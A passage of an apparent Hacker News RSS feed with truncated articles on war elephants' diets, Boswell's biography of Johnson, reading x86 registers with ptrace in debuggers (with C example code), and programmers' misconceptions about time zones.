<figure><img data-attachment-id="642" data-permalink="https://acoup.blog/1280px-sumatran_elephants/" data-orig-file="https://acoupdotblog.files.wordpress.com/2019/08/1280px-sumatran_elephants.jpg" data-orig-size="1280,852" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="1280px-sumatran_elephants" data-image-description="" data-medium-file="https://acoupdotblog.files.wordpress.com/2019/08/1280px-sumatran_elephants.jpg?w=300" data-large-file="https://acoupdotblog.files.wordpress.com/2019/08/1280px-sumatran_elephants.jpg?w=1024" src="https://acoupdotblog.files.wordpress.com/2019/08/1280px-sumatran_elephants.jpg" alt=""><figcaption>Asian Elephant eating, via <a href="https://commons.wikimedia.org/wiki/Category:Elephas_maximus#/media/File:Sumatran_elephants.jpg">Wikimedia Commons</a>.  They do this <strong>a lot</strong>.</figcaption></figure>



<p>Believe it or not, this <em>understates</em> just how hungry – and expensive – elephants are.  The standard barley ration for a Roman horse was 7kg of barley per day (7 Attic medimnoi per month; Plb. 6.39.12); this would be supplemented by grazing.  Estimates for the food requirements of elephants vary widely (in part, it is hard to measure the dietary needs of grazing animals), but elephants require in excess of 1.5% of their body-weight in food <em>per day</em>.  …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://acoup.blog/2019/08/02/collections-war-elephants-part-ii-elephants-against-wolves/">https://acoup.blog/2019/08/02/collections-war-elephants-part-ii-elephants-against-wolves/</a></em></p>]]>
            </description>
            <link>https://acoup.blog/2019/08/02/collections-war-elephants-part-ii-elephants-against-wolves/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24870626</guid>
            <pubDate>Fri, 23 Oct 2020 15:38:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Boswell's Life of Johnson]]>
            </title>
            <description>
<![CDATA[
Score 62 | Comments 23 (<a href="https://news.ycombinator.com/item?id=24870552">thread link</a>) | @benbreen
<br/>
October 23, 2020 | https://fantasticanachronism.com/2020/10/22/when-the-worst-man-in-the-world-writes-a-masterpiece/# | <a href="https://web.archive.org/web/*/https://fantasticanachronism.com/2020/10/22/when-the-worst-man-in-the-world-writes-a-masterpiece/#">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Boswell's <em>Life of Johnson</em> is not just one of my favorite books, it also engendered some of my favorite book reviews. While praise for the work is universal, the main question commentators try to answer is this: how did the worst man in the world manage to write the best biography?</p><p>Who was James Boswell? He was a perpetual drunk, a degenerate gambler, a sex addict, whoremonger, exhibitionist, and rapist. He gave his wife an STD he caught from a prostitute.</p><p>Selfish, servile and self-indulgent, lazy and lecherous, vain, proud, obsessed with his aristocratic status, yet with no sense of propriety whatsoever, he frequently fantasized about the feudal affection of serfs for their lords. He loved to watch executions and was a proud supporter of slavery.</p><p>“Where ordinary bad taste leaves off,” John Wain comments, “Boswell began.” The Thrales were long-time friends and patrons of Johnson; a <em>single day</em> after Henry Thrale died, Boswell wrote a poem fantasizing about the elderly Johnson and the just-widowed Hester: "Convuls'd in love's tumultuous throws, / We feel the aphrodisian spasm". The rest of his verse is of a similar quality; naturally he considered himself a great poet.</p><p>Boswell combined his terrible behavior with a complete lack of shame, faithfully reporting every transgression, every moronic ejaculation, every faux pas. The first time he visited London he went to see a play and, as he happily tells us himself, he "entertained the audience prodigiously by imitating the lowing of a cow."</p><p>By all accounts, including his own, he was an idiot. On a tour of Europe, his tutor said to him: "of young men who have studied I have never found one who had so few ideas as you."</p><p>As a lawyer he was a perpetual failure, especially when he couldn't get Johnson to write his arguments for him. As a politician he didn't even get the chance to be a failure despite decades of trying.</p><p>His correspondence with Johnson mostly consists of Boswell whining pathetically and Johnson telling him to get his shit together.</p><p>He commissioned a portrait from his friend Joshua Reynolds and stiffed him on the payment. His descendants hid the portrait in the attic because they were ashamed of being related to him.</p><p>Desperate for fame, he kept trying to attach himself to important people, mostly through sycophancy. In Geneva he pestered Rousseau,<span><a href="#fn10521873801" rel="footnote"><sup id="fnref10521873801">1</sup></a></span> leading to this conversation:</p><blockquote><p>Rousseau: You are irksome to me. It’s my nature. I cannot help it.<br>Boswell: Do not stand on ceremony with me.<br>Rousseau: Go away.</p></blockquote><p>Later, Boswell was given the task of escorting Rousseau's mistress Thérèse Le Vasseur to England—they had an affair on the way.</p><p>When Adam Smith and Edward Gibbon were elected to The Literary Club, Boswell considered leaving because he thought the club had now "lost its select merit"!</p><p>On the positive side, his humor and whimsy made for good conversation; he put people at ease; he gave his children all the love his own father had denied him; and, somehow, he wrote one of the great works of English literature.</p><p><em>The Life of Samuel Johnson, LL.D.</em> was an instant sensation. While the works of Johnson were quickly forgotten,<span><a href="#fn10521873802" rel="footnote"><sup id="fnref10521873802">2</sup></a></span> his biography has never been out of print in the 229 years since its initial publication. It went through 41 editions just in the 19th century.</p><p>Burke told King George III that he had never read anything more entertaining. Coleridge said "it is impossible not to be amused with such a book." George Bernard Shaw compared Boswell's dramatization of Johnson to Plato's dramatization of Socrates, and placed old Bozzy in the middle of an "apostolic succession of dramatists" from the Greek tragedians through Shakespeare and ending, of course, with Shaw himself.</p><p>It is a strange work, an experimental collage of different modes: part traditional biography, part collection of letters, and part direct reports of Johnson's life as observed by Boswell.<span><a href="#fn10521873803" rel="footnote"><sup id="fnref10521873803">3</sup></a></span> His inspiration came not from literature, but from the minute naturalistic detail of Flemish paintings. It is difficult to convey its greatness in compressed form: Boswell is not a great writer at the sentence level, and all the famous quotes are Johnsonian <em>bon mots</em>. The book succeeds through a cumulative effect.</p><p>Johnson was 54 years old when he first met Boswell, and most of his major accomplishments (the poetry, the dictionary, <em>The Rambler</em>) were behind him; his wife had already died; he was already the recipient of a £300 pension from the King; his edition of Shakespeare was almost complete. All in all they spent no more than 400 days together. Boswell had limited material to work with, but what he doesn't capture in fact, he captures in feeling: an entire life is contained in this book: love and friendship, taverns and work, the glory of success and recognition, the depressive bouts of failure and penury, the inevitable tortures of aging and death.</p><p>Out of a person, Boswell created a literary personality. His powers of characterization are positively Shakespearean, and his Johnson resembles none other but the bard's greatest creation: Sir John Falstaff. Big, brash, and deeply flawed, but also lovable. He would "laugh like a rhinoceros":</p><blockquote><p>Johnson could not stop his merriment, but continued it all the way till he got without the Temple-gate. He then burst into such a fit of laughter that he appeared to be almost in a convulsion; and in order to support himself, laid hold of one of the posts at the side of the foot pavement, and sent forth peals so loud, that in the silence of the night his voice seemed to resound from Temple-bar to Fleet ditch.</p></blockquote><p>And around Johnson he painted an entire dramatic cast, bringing 18th century London to life: Garrick the great actor, Reynolds the painter, Beauclerk with his banter, Goldsmith with his insecurities. Monboddo and Burke, Henry and Hester Thrale, the blind Mrs Williams and the Jamaican freedman Francis Barber.</p><p>Borges (who was also a big fan) finds his parallels not in Shakespeare and Falstaff, but in Cervantes and Don Quixote. He (rather implausibly) suggests that every Quixote needs his Sancho, and "Boswell appears as a despicable character" deliberately to create a contrast.<span><a href="#fn10521873804" rel="footnote"><sup id="fnref10521873804">4</sup></a></span></p><p>And in the 1830s, two brilliant and influential reviews were written by two polar opposites: arch-progressive Thomas Babington Macaulay and radical reactionary Thomas Carlyle. The first thing you'll notice is their sheer magnitude: <a href="https://oll-resources.s3.amazonaws.com/titles/362/1227.01_Bk.pdf" target="_blank" rel="noopener">Macaulay's</a> is 55 pages long, while <a href="https://sci-hub.se/https://doi.org/10.1017/CBO9780511697234.003" target="_blank" rel="noopener">Carlyle's review in Fraser's Magazine</a> reaches 74 pages!<span><a href="#fn10521873805" rel="footnote"><sup id="fnref10521873805">5</sup></a></span> And while they both agree that it's a great book and that Boswell was a scoundrel, they have very different theories about what happened.</p><h2 id="Macaulay"><a href="#Macaulay" title="Macaulay"></a>Macaulay</h2><p>Never in history, Macaulay says, has there been "so strange a phænomenon as this book". On the one hand he has effusive praise:</p><blockquote><p>Homer is not more decidedly the first of heroic poets, Shakspeare is not more decidedly the first of dramatists, Demosthenes is not more decidedly the first of orators, than Boswell is the first of biographers. He has no second. He has distanced all his competitors so decidedly that it is not worth while to place them.</p></blockquote><p>On the other hand, he spends several paragraphs laying into Boswell with gusto:</p><blockquote><p>He was, if we are to give any credit to his own account or to the united testimony of all who knew him, a man of the meanest and feeblest intellect. [...] He was the laughing-stock of the whole of that brilliant society which has owed to him the greater part of its fame. He was always laying himself at the feet of some eminent man, and begging to be spit upon and trampled upon. [...] Servile and impertinent, shallow and pedantic, a bigot and a sot, bloated with family pride, and eternally blustering about the dignity of a born gentleman, yet stooping to be a talebearer, an eavesdropper, a common butt in the taverns of London.</p></blockquote><p>Macaulay's theory is that while Homer and Shakespeare and all the other greats owe their eminence to their virtues, Boswell is unique in that he owes <em>his</em> success to his vices.</p><blockquote><p>He was a slave, proud of his servitude, a Paul Pry, convinced that his own curiosity and garrulity were virtues, an unsafe companion who never scrupled to repay the most liberal hospitality by the basest violation of confidence, a man without delicacy, without shame, without sense enough to know when he was hurting the feelings of others or when he was exposing himself to derision; and because he was all this, he has, in an important department of literature, immeasurably surpassed such writers as Tacitus, Clarendon, Alfieri, and his own idol Johnson.</p></blockquote><blockquote><p>Of the talents which ordinarily raise men to eminence as writers, Boswell had absolutely none. There is not in all his books a single remark of his own on literature, politics, religion, or society, which is not either commonplace or absurd. [...] Logic, eloquence, wit, taste, all those things which are generally considered as making a book valuable, were utterly wanting to him. He had, indeed, a quick observation and a retentive memory. These qualities, if he had been a man of sense and virtue, would scarcely of themselves have sufficed to make him conspicuous; but, because he was a dunce, a parasite, and a coxcomb, they have made him immortal.</p></blockquote><p>The work succeeds partly because of its subject: if Johnson had not been so extraordinary, then airing all his dirty laundry would have just made him look bad.</p><blockquote><p>No man, surely, ever published such stories respecting persons whom he professed to love and revere. He would infallibly have made his hero as contemptible as he has made himself, had not his hero really possessed some moral and intellectual qualities of a very high order. The best proof that Johnson was really an extraordinary man is that his character, instead of being degraded, has, on the whole, been decidedly raised by a work in which all his vices and weaknesses are exposed.</p></blockquote><p>And finally, Boswell provided Johnson with a curious form of literary fame:</p><blockquote><p>The reputation of [Johnson's] writings, which he probably expected to be immortal, is every day fading; while those peculiarities of manner and that careless …</p></blockquote></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://fantasticanachronism.com/2020/10/22/when-the-worst-man-in-the-world-writes-a-masterpiece/#">https://fantasticanachronism.com/2020/10/22/when-the-worst-man-in-the-world-writes-a-masterpiece/#</a></em></p>]]>
            </description>
            <link>https://fantasticanachronism.com/2020/10/22/when-the-worst-man-in-the-world-writes-a-masterpiece/#</link>
            <guid isPermaLink="false">hacker-news-small-sites-24870552</guid>
            <pubDate>Fri, 23 Oct 2020 15:33:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How Debuggers Work: Getting and Setting x86 Registers]]>
            </title>
            <description>
<![CDATA[
Score 132 | Comments 11 (<a href="https://news.ycombinator.com/item?id=24870497">thread link</a>) | @tosh
<br/>
October 23, 2020 | https://www.moritz.systems/blog/how-debuggers-work-getting-and-setting-x86-registers-part-1/ | <a href="https://web.archive.org/web/*/https://www.moritz.systems/blog/how-debuggers-work-getting-and-setting-x86-registers-part-1/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>


<p><img src="https://raw.githubusercontent.com/Moritz-Systems/moritz_staticDir/master/cpu-context-switch.svg" alt="Context Switch"></p>

<p>In this article, I would like to shortly describe the methods used
to dump and restore the different kinds of registers on 32-bit
and 64-bit x86 CPUs.  The first part will focus on General Purpose
Registers, Debug Registers and Floating-Point Registers up to the XMM
registers provided by the SSE extension.  I will explain how their
values can be obtained via the <code>ptrace(2)</code> interface.</p>

<p>The <code>ptrace(2)</code> API is commonly used in all modern BSD systems
and Linux, as all of them derive it from the original form designed
and implemented in 4.3BSD.  The primary focus in this article is
on the FreeBSD and NetBSD systems.  Nevertheless, the users of other
Operating Systems such as OpenBSD, DragonFly BSD or Linux can still
benefit from this article as the basic principles are the same
and the code examples are intended to be easily adapted to other
platforms.</p>

<p>A single CPU (in modern hardware: CPU core or CPU thread,
if hyperthreading is available) can execute only one program thread
at a time.  In order to be able to run multiple processes and threads
quasi-simultaneously, the Operating System must perform <em>context
switching</em> — that is periodically suspend the currently running thread,
save its state, restore the saved state of another thread and resume it.
Saving and restoring the values of the processor’s registers play
an important part in context switching.  It is important that
this process is fully transparent to the process being switched,
and in a properly implemented kernel there should be no side effects
that are perceptible to the program.</p>

<p>The debugger may need to examine the register sets of the debugged
program for a number of reasons.  By inspecting the Program Counter,
it is able to determine the location in source code at which
the execution will continue, and by altering it it can control
the execution.  The Stack Pointer is necessary to introspect variables
stored on the stack, while the remaining registers can hold variables
themselves.</p>

<p>A special set of the x86 registers are the Debug Registers.  They are
not accessible to the program itself; however, they can be read
or written by the debugger.  They allow setting hardware assisted
breakpoints (instruction execute trap) on the code being executed,
and watchpoints (read and/or write operation trap) on the variables.</p>

<h2 id="general-purpose-registers-gpr">General Purpose Registers (GPR)</h2>

<h3 id="copying-gprs">Copying GPRs</h3>

<p>The term ‘General Purpose Registers’ is a bit ambiguous.
In the narrower sense, it means the few (8 on i386, 16 on amd64)
baseline registers that can be used to store arbitrary data (usually
integers or pointers).  In the wider sense it means all baseline
registers in the processor architecture, historically excluding
floating-point registers and special kinds of registers.  On x86, this
includes the ‘narrower sense’ general-purpose registers, the Program
Counter (EIP/RIP), segment registers and the flag register.</p>

<p>The majority of the General Purpose Registers can be copied directly,
e.g. using the <code>MOV</code> instruction, or pushed onto the stack
via <code>PUSH</code>.  The EIP/RIP register can be copied using the <code>LEA</code>
instruction, and restored via <code>JMP</code>.  The flag register can be pushed
onto the stack via <code>PUSHFD</code>/<code>PUSHFQ</code>, and afterwards popped from it
via <code>POPFD</code>/<code>POPFQ</code>.</p>

<p>The listing below demonstrates a program that grabs the values of all
amd64 GPRs at an arbitrary point during the execution and prints them
after returning from assembly.</p>

<p>(<a href="https://github.com/Moritz-Systems/how-debuggers-work-registers-part-1/blob/master/dump-gpr.c">standalone example source</a>,
 <a href="#the-gpr-ptrace-2-api">skip listing</a>)</p>

<pre><code>#include &lt;stdio.h&gt;
#include &lt;stdint.h&gt;

enum {
    R_RAX, R_RBX, R_RCX, R_RDX, R_RSI, R_RDI, R_RBP, R_RSP,
    R_R8, R_R9, R_R10, R_R11, R_R12, R_R13, R_R14, R_R15,
    R_RIP, R_RFLAGS,
    R_LENGTH
};

enum {
    S_CS, S_DS, S_ES, S_FS, S_GS, S_SS,
    S_LENGTH
};

int main()
{
    uint64_t gpr[R_LENGTH];
    uint16_t seg[S_LENGTH];

    asm volatile (
        /* fill registers with random data */
        "mov $0x0102030405060708, %%rax\n\t"
        "mov $0x1112131415161718, %%rbx\n\t"
        "mov $0x2122232425262728, %%rcx\n\t"
        "mov $0x3132333435363738, %%rdx\n\t"
        "mov $0x4142434445464748, %%rsi\n\t"
        "mov $0x5152535455565758, %%rdi\n\t"
        /* RBP is used for frame pointer, RSP is stack pointer */
        "mov $0x8182838485868788, %%r8\n\t"
        "mov $0x9192939495969798, %%r9\n\t"
        "mov $0xa1a2a3a4a5a6a7a8, %%r10\n\t"
        "mov $0xb1b2b3b4b5b6b7b8, %%r11\n\t"
        "mov $0xc1c2c3c4c5c6c7c8, %%r12\n\t"
        "mov $0xd1d2d3d4d5d6d7d8, %%r13\n\t"
        "mov $0xe1e2e3e4e5e6e7e8, %%r14\n\t"
        "mov $0xf1f2f3f4f5f6f7f8, %%r15\n\t"

        /* dump GPRs */
        "mov %%rax, %[rax]\n\t"
        "mov %%rbx, %[rbx]\n\t"
        "mov %%rcx, %[rcx]\n\t"
        "mov %%rdx, %[rdx]\n\t"
        "mov %%rsi, %[rsi]\n\t"
        "mov %%rdi, %[rdi]\n\t"
        "mov %%rbp, %[rbp]\n\t"
        "mov %%rsp, %[rsp]\n\t"
        "mov %%r8, %[r8]\n\t"
        "mov %%r9, %[r9]\n\t"
        "mov %%r10, %[r10]\n\t"
        "mov %%r11, %[r11]\n\t"
        "mov %%r12, %[r12]\n\t"
        "mov %%r13, %[r13]\n\t"
        "mov %%r14, %[r14]\n\t"
        "mov %%r15, %[r15]\n\t"
        /* dump RIP */
        "lea (%%rip), %%rbx\n\t"
        "mov %%rbx, %[rip]\n\t"
        "mov %[rbx], %%rbx\n\t"
        /* dump segment registers */
        "mov %%cs, %[cs]\n\t"
        "mov %%ds, %[ds]\n\t"
        "mov %%es, %[es]\n\t"
        "mov %%fs, %[fs]\n\t"
        "mov %%gs, %[gs]\n\t"
        "mov %%ss, %[ss]\n\t"
        /* dump RFLAGS */
        "pushfq\n\t"
        "popq %[rflags]\n\t"

        : [rax] "=m"(gpr[R_RAX]), [rbx] "=m"(gpr[R_RBX]),
          [rcx] "=m"(gpr[R_RCX]), [rdx] "=m"(gpr[R_RDX]),
          [rsi] "=m"(gpr[R_RSI]), [rdi] "=m"(gpr[R_RDI]),
          [rbp] "=m"(gpr[R_RBP]), [rsp] "=m"(gpr[R_RSP]),
           [r8] "=m"(gpr[ R_R8]), [ r9] "=m"(gpr[ R_R9]),
          [r10] "=m"(gpr[R_R10]), [r11] "=m"(gpr[R_R11]),
          [r12] "=m"(gpr[R_R12]), [r13] "=m"(gpr[R_R13]),
          [r14] "=m"(gpr[R_R14]), [r15] "=m"(gpr[R_R15]),
          [rip] "=m"(gpr[R_RIP]), [rflags] "=m"(gpr[R_RFLAGS]),
          [cs] "=m"(seg[S_CS]), [ds] "=m"(seg[S_DS]),
          [es] "=m"(seg[S_ES]), [fs] "=m"(seg[S_FS]),
          [gs] "=m"(seg[S_GS]), [ss] "=m"(seg[S_SS])
        :
        : "%rax", "%rbx", "%rcx", "%rdx", "%rsi", "%rdi",
          "%r8", "%r9", "%r10", "%r11", "%r12", "%r13", "%r14", "%r15",
          "memory"
    );

    printf("rax = 0x%016lx\n", gpr[R_RAX]);
    printf("rbx = 0x%016lx\n", gpr[R_RBX]);
    printf("rcx = 0x%016lx\n", gpr[R_RCX]);
    printf("rdx = 0x%016lx\n", gpr[R_RDX]);
    printf("rsi = 0x%016lx\n", gpr[R_RSI]);
    printf("rdi = 0x%016lx\n", gpr[R_RDI]);
    printf("rbp = 0x%016lx\n", gpr[R_RBP]);
    printf("rsp = 0x%016lx\n", gpr[R_RSP]);
    printf(" r8 = 0x%016lx\n", gpr[R_R8]);
    printf(" r9 = 0x%016lx\n", gpr[R_R9]);
    printf("r10 = 0x%016lx\n", gpr[R_R10]);
    printf("r11 = 0x%016lx\n", gpr[R_R11]);
    printf("r12 = 0x%016lx\n", gpr[R_R12]);
    printf("r13 = 0x%016lx\n", gpr[R_R13]);
    printf("r14 = 0x%016lx\n", gpr[R_R14]);
    printf("r15 = 0x%016lx\n", gpr[R_R15]);
    printf("rip = 0x%016lx\n", gpr[R_RIP]);
    printf("cs = 0x%04x\n", seg[S_CS]);
    printf("ds = 0x%04x\n", seg[S_DS]);
    printf("es = 0x%04x\n", seg[S_ES]);
    printf("fs = 0x%04x\n", seg[S_FS]);
    printf("gs = 0x%04x\n", seg[S_GS]);
    printf("ss = 0x%04x\n", seg[S_SS]);
    printf("rflags = 0x%016lx\n", gpr[R_RFLAGS]);

    return 0;
}
</code></pre>

<h3 id="the-gpr-ptrace-2-api">The GPR ptrace(2) API</h3>

<p>Both FreeBSD and NetBSD use the <code>PT_GETREGS</code> request to get the values
of GPRs from the program, and <code>PT_SETREGS</code> to update them.
The requests take a pointer to <code>struct reg</code> as an argument.</p>

<p>On FreeBSD, both i386 and amd64 have the individual registers listed
as fields of the struct.  On NetBSD, i386 uses a regular structure,
while amd64 puts all values into an array whose indices are defined
in the headers as constants.</p>

<p>The listing below compares the structures used on FreeBSD and NetBSD.
Note that NetBSD/amd64 uses a special macro.  For example,
<code>greg(rdi RDI, 0)</code> defines <code>_REG_RDI</code>.</p>

<p>(<a href="https://github.com/freebsd/freebsd/blob/master/sys/x86/include/reg.h#L99">FreeBSD structs</a>,
 <a href="https://github.com/NetBSD/src/blob/trunk/sys/arch/i386/include/reg.h#L70">NetBSD/i386 struct</a>,
 <a href="https://github.com/NetBSD/src/blob/trunk/sys/arch/amd64/include/reg.h#L45">NetBSD/amd64 struct</a>,
 <a href="https://github.com/NetBSD/src/blob/trunk/sys/arch/amd64/include/frame_regs.h#L6">NetBSD/amd64 register names</a>,
 <a href="#floating-point-registers">skip listing</a>)</p>

<pre><code>/* FreeBSD/i386 */               /* NetBSD/i386 */

struct __reg32 {                 struct reg {
    __uint32_t  r_fs;               int r_eax;
    __uint32_t  r_es;               int r_ecx;
    __uint32_t  r_ds;               int r_edx;
    __uint32_t  r_edi;              int r_ebx;
    __uint32_t  r_esi;              int r_esp;
    __uint32_t  r_ebp;              int r_ebp;
    __uint32_t  r_isp;              int r_esi;
    __uint32_t  r_ebx;              int r_edi;
    __uint32_t  r_edx;              int r_eip;
    __uint32_t  r_ecx;              int r_eflags;
    __uint32_t  r_eax;              int r_cs;
    __uint32_t  r_trapno;           int r_ss;
    __uint32_t  r_err;              int r_ds;
    __uint32_t  r_eip;              int r_es;
    __uint32_t  r_cs;               int r_fs;
    __uint32_t  r_eflags;           int r_gs;
    __uint32_t  r_esp;           };
    __uint32_t  r_ss;
    __uint32_t  r_gs;
};


/* FreeBSD/amd64 */              /* NetBSD/amd64 */

struct __reg64 {                 #define _FRAME_REG(greg, freg) \
    __int64_t   r_r15;               greg(rdi, RDI, 0) \
    __int64_t   r_r14;               greg(rsi, RSI, 1) \
    __int64_t   r_r13;               greg(rdx, RDX, 2) \
    __int64_t   r_r12;               greg(r10, R10, 6) \
    __int64_t   r_r11;               greg(r8,  R8,  4) \
    __int64_t   r_r10;               greg(r9,  R9,  5) \
    __int64_t   r_r9;                /* ... */ \
    __int64_t   r_r8;                greg(rcx, RCX, 3) \
    __int64_t   r_rdi;               greg(r11, R11, 7) \
    __int64_t   r_rsi;               greg(r12, R12, 8) \
    __int64_t   r_rbp;               greg(r13, R13, 9) \
    __int64_t   r_rbx;               greg(r14, R14, 10) \
    __int64_t   r_rdx;               greg(r15, R15, 11) \
    __int64_t   r_rcx;               greg(rbp, RBP, 12) \
    __int64_t   r_rax;               …</code></pre></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.moritz.systems/blog/how-debuggers-work-getting-and-setting-x86-registers-part-1/">https://www.moritz.systems/blog/how-debuggers-work-getting-and-setting-x86-registers-part-1/</a></em></p>]]>
            </description>
            <link>https://www.moritz.systems/blog/how-debuggers-work-getting-and-setting-x86-registers-part-1/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24870497</guid>
            <pubDate>Fri, 23 Oct 2020 15:29:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[CSS Spider – fast and easy way to check, copy and edit CSS]]>
            </title>
            <description>
<![CDATA[
Score 15 | Comments 15 (<a href="https://news.ycombinator.com/item?id=24870450">thread link</a>) | @URfejk
<br/>
October 23, 2020 | https://cssspider.fresalabs.com/home | <a href="https://web.archive.org/web/*/https://cssspider.fresalabs.com/home">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://cssspider.fresalabs.com/home</link>
            <guid isPermaLink="false">hacker-news-small-sites-24870450</guid>
            <pubDate>Fri, 23 Oct 2020 15:25:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Falsehoods programmers believe about time zones]]>
            </title>
            <description>
<![CDATA[
Score 42 | Comments 13 (<a href="https://news.ycombinator.com/item?id=24870376">thread link</a>) | @Gedxx
<br/>
October 23, 2020 | https://www.zainrizvi.io/blog/falsehoods-programmers-believe-about-time-zones/ | <a href="https://web.archive.org/web/*/https://www.zainrizvi.io/blog/falsehoods-programmers-believe-about-time-zones/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
			<!-- .cover -->


				<div>
					<p>My aunt has a problem</p><p>She loves joining Zoom meetings, but they're all hosted in different time zones. It's hard to remember if she should add 4 hours, subtract 3, or what. She's not the most technical person, so google isn't an option. She has to ask for help.</p><p>Every. Single. Time.</p><p>And, for the less technically minded, it's also error-prone.</p><p>Last a couple weeks ago I thought:</p><p>What if event organizers could share a link that would do the work for you? If someone clicked on <a href="https://www.zainrizvi.io/blog/falsehoods-programmers-believe-about-time-zones/mytime.io/5pm/EST">mytime.at/5pm/EST</a>, they would see their local version of that time. It sounded simple enough.</p><p>I began coding. </p><figure><img src="https://www.zainrizvi.io/content/images/2020/10/image-5.png" alt="" srcset="https://www.zainrizvi.io/content/images/size/w600/2020/10/image-5.png 600w, https://www.zainrizvi.io/content/images/2020/10/image-5.png 699w"><figcaption>I later discovered mytime.io had already implemented a very similar thing, and run into the same pitfalls</figcaption></figure><p>I knew trying to manage time <a href="https://www.youtube.com/watch?v=-5wpm-gesOY">is a fool's errand</a>, but that's what datetime libraries are for. I would merely build an extra time zone conversion layer on top.</p><p>Surely that couldn't be complicated</p><p>...Right?</p><p>I soon discovered just how wrong I was. One after another, I kept learning the falsehood of yet another "fact" that had seemed obviously true. Eventually my original vision became literally impossible to pull off without making serious compromises (more about that in a future blog post).</p><p>Hopefully this list will help you avoid the landmines I stepped on. All the falsehoods below are ones I'd considered true at some point in my adult life. </p><p>Most of them I believed just one month ago.</p><h3 id="misconception-1-utc-offsets-go-from-12-to-12"><strong>Misconception #1: UTC offsets go from -12 to +12</strong></h3><p>Turns out, UTC offsets span from -12 to +14. Yeah, +14. That's gives you 27 hours UTC can be offset by (don't forget the zero offset)</p><p>How does it work? UTC-12 has the same time as UTC+12, but is one day behind. Same goes for UTC-11 and UTC+13, etc.</p><p>Why that crazy range? That was a result of pacific islanders decided they wanted to be on a specific side of the international date line. </p><p>It makes for a very jagged international date line</p><figure><img src="https://www.zainrizvi.io/content/images/2020/10/pasted-image-0--1-.png" alt="" srcset="https://www.zainrizvi.io/content/images/2020/10/pasted-image-0--1-.png 600w"></figure><h3 id="misconception-2-every-utc-offset-corresponds-to-exactly-one-time-zone">Misconception #2: Every UTC offset corresponds to exactly one time zone</h3><p>Here are 10 distinct time zones which are all at UTC+5:</p><ul><li>Aqtobe Time</li><li>Mawson Time</li><li>Maldives Time</li><li>Oral Time</li><li>Pakistan Standard Time</li><li>French Southern and Antarctic Time</li><li>Tajikistan Time</li><li>Turkmenistan Time</li><li>Uzbekistan Time</li><li>Yekaterinburg Time</li></ul><p>You might be wondering: if they’re all at the same UTC offset, why couldn’t all those countries just use the same time zone? Perhaps Pakistanis weren’t keen about being on “Yekaterinburg Time”</p><h3 id="misconception-3-there-are-more-countries-in-the-world-than-time-zones">Misconception #3: <strong>There are more countries in the world than time zones</strong></h3><p>How could this one possibly be wrong? Well...</p><ol><li>Many countries want their very own time zone (how many do you think run on Myanmar Time?)</li><li>Some countries split themselves up into multiple time zones (e.g. eastern and western times)</li><li>Military time alone uses 25 time zones, one for each hour from UTC-12 to UTC+12</li><li>DST. More on this one below</li></ol><p>All together, there are<a href="https://www.timeanddate.com/time/zones/"> 244 time zones</a> used by the 195 countries in the world.</p><h3 id="misconception-4-every-time-zone-has-exactly-one-agreed-upon-name">Misconception #4: <strong>Every time zone has exactly one agreed upon name</strong></h3><p>Ever notice how every time zone consists only of English words? Awfully kind of Spanish and French speaking countries to graciously use our language, right?</p><p>Hah, Yeah right. </p><p>Eastern Standard Time, Tiempo del Este, and Heure Normale de l'Est are all different names for the exact same time zone.</p><p>Have fun coding that into your library.</p><h3 id="misconception-5-time-zones-are-always-offset-from-utc-by-an-integer-number-of-hours">Misconception #5: <strong>Time zones are always offset from UTC by an integer number of hours</strong></h3><p>India standard time is five and a half hours off of UTC. There are many more examples</p><h3 id="misconception-6-fine-time-zones-are-always-offset-from-utc-by-an-integer-number-of-half-hours">Misconception #6: <strong>Fine, time zones are always offset from UTC by an integer number of half-hours</strong></h3><p>Nepal likes to be at the 45 minute UTC offset.</p><p>Why does that extra 15 minutes matter so much to them? Because<a href="https://www.bbc.com/news/world-asia-33815153#:~:text=Nepal%20is%205%20hours%20and,a%20mountain%20east%20of%20Kathmandu.&amp;text=It%20gets%20trickier%20in%20the,t%20officially%20have%20time%20zones."> they really want</a> their mountain to have the sun right above it at noon.</p><p>But it makes you wonder: what would happen if the mountain ever shifted?</p><figure><img src="https://www.zainrizvi.io/content/images/2020/10/mountain-moved-3.jpeg" alt="" srcset="https://www.zainrizvi.io/content/images/size/w600/2020/10/mountain-moved-3.jpeg 600w, https://www.zainrizvi.io/content/images/size/w1000/2020/10/mountain-moved-3.jpeg 1000w, https://www.zainrizvi.io/content/images/size/w1600/2020/10/mountain-moved-3.jpeg 1600w, https://www.zainrizvi.io/content/images/2020/10/mountain-moved-3.jpeg 2126w" sizes="(min-width: 720px) 720px"></figure><h3 id="misconception-7-a-country-stays-at-the-same-utc-offset-all-year-long">Misconception #7: <strong>A country stays at the same UTC offset all year long</strong></h3><p>Don't forget about Daylight Saving Time! Or as the Europeans call it "Summer Time." &nbsp;</p><p>Countries practicing DST change their UTC offset twice every year.</p><h3 id="misconception-8-there-is-a-standard-format-for-declaring-time-zones">Misconception #8: <strong>There is a standard format for declaring time zones</strong></h3><p>Hah, I wish. Here are some standards I discovered, there may be more:</p><h4 id="common-name">Common name</h4><p>These are the traditional time zone names we’re used to. Example: Pacific Standard Time.</p><p>But I don't know if there's an official term for these names, they just that 